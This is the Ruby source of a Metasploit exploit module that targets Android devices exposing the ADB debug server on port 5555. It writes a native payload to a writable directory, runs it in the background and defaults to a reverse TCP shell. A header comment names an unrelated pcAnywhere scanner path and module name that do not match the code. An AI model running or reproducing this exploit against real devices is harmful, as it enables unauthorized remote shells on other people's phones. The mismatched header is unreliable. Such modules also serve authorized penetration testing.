##/opt/metasploit/apps/pro/msf3/modules/auxiliary/scanner/pcanywhere
# use auxiliary/scanner/pcanywhere/PrimerEscaner
# LHOST LPORT 12345 THREADS 1
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/adb'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android ADB Debug Server Remote Payload Execution',
      'Description'    => %q{
        Writes and spawns a native payload on an android device that is listening
        for adb debug messages.
      },
      'Author'         => ['joev'],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'PAYLOAD' => 'linux/armle/shell_reverse_tcp' },
      'Platform'       => 'linux',
      'Arch'           => [ARCH_ARMLE, ARCH_X86, ARCH_X86_64, ARCH_MIPSLE],
      'Targets'        => [
        ['armle',  {'Arch' => ARCH_ARMLE}],
        ['x86',    {'Arch' => ARCH_X86}],
        ['x64',    {'Arch' => ARCH_X86_64}],
        ['mipsle', {'Arch' => ARCH_MIPSLE}]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 01 2016'
    ))

    register_options([
      Opt::RPORT(5555),
      OptString.new('WritableDir', [true, 'Writable directory', '/data/local/tmp/'])
    ], self.class)
  end

  def check
    setup_adb_connection do
      device_info = @adb_client.connect.data
      print_good "Detected device:\n#{device_info}"
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Unknown
  end

  def execute_command(cmd, opts)
    response = @adb_client.exec_cmd(cmd)
    print_good "Command executed, response:\n #{response}"
  end

  def exploit
    setup_adb_connection do
      device_data = @adb_client.connect
      print_good "Connected to device:\n#{device_data.data}"
      execute_cmdstager({
        flavor: :echo,
        enc_format: :octal,
        prefix: '\\\\0',
        temp: datastore['WritableDir'],
        linemax: Rex::Proto::ADB::Message::Connect::DEFAULT_MAXDATA-8,
        background: true,
        nodelete: true
      })
    end
  end

  def setup_adb_connection(&blk)
    begin
      print_status "Connecting to device..."
      connect
      @adb_client = Rex::Proto::ADB::Client.new(sock)
      blk.call
    ensure
      disconnect
    end
  end

end
